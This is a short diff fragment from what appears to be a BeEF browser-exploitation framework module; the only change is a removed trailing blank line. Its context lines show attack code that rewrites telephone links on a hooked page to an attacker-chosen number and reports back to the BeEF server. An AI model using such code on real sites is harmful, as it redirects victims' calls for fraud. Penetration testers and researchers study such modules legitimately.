@@ -12,4 +12,3 @@ beef.execute(function() {
 	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+beef.dom.rewriteTelLinks(tel_number, selector)+' telephone (tel) links rewritten to '+tel_number);
 
 });
-
